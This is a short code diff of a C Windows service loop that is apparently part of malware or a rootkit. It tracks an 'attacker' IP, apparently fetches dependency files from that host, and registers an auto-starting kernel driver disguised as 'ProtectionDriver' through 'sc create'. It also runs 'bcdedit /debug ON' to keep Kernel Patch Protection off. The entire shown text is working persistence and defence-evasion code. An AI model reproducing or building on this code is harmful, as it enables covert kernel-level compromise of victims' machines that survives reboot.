@@ -18,6 +18,7 @@ DWORD WINAPI ServiceMainThread(LPVOID lpParam) {
     char TargetIp[MAXIPV4_ADDRESS_SIZE] = { 0 };
     char AttackerIp[MAXIPV4_ADDRESS_SIZE] = { 0 };
     const char* AttackAddresses = "192.168.1.21~192.168.1.10~192.168.40.1";
+    WCHAR DriverServiceCreateCommand[MAX_PATH] = { 0 };
 
 
     // Get IP addresses of target and attacker:
@@ -26,18 +27,31 @@ DWORD WINAPI ServiceMainThread(LPVOID lpParam) {
     }
 
 
-    // Make sure that all depended-on files exist on target machine (folders + files):
-    LastError = VerfifyDepDirs(AppDataPath);
-    if (LastError != 0) {
-        return LastError;
-    }
-    LastError = VerfifyDepFiles(AttackerIp, AppDataPath);
-    if (LastError != 0) {
-        return LastError;
-    }
-
-
     while (TRUE) {
+        // Make sure that all depended-on files exist on target machine (folders + files):
+        LastError = VerfifyDepDirs(AppDataPath);
+        if (LastError != 0) {
+            return LastError;
+        }
+        LastError = VerfifyDepFiles(AttackerIp, AppDataPath);
+        if (LastError != 0) {
+            return LastError;
+        }
+
+
+        // Create service (if did not exist already, if does sc create will fail):
+        wcscat_s(DriverServiceCreateCommand, L"sc create ProtectionDriver type=kernel start=auto binPath=\"");
+        wcscat_s(DriverServiceCreateCommand, AppDataPath);
+        wcscat_s(DriverServiceCreateCommand, L"\\ProtectionSolution\\KernelDriver\\ProtectionDriver.sys\"");
+        if (_wsystem(DriverServiceCreateCommand) == -1) {
+            return GetLastError();
+        }
+
+
+        // Verify if shortcut to wrappers dont point to wrappers, if so - link again:
+        // TODO
+        
+
         // Make sure that KPP is still turned off:
         if (system("bcdedit /debug ON") == -1) {
             return ERROR_FUNCTION_FAILED;
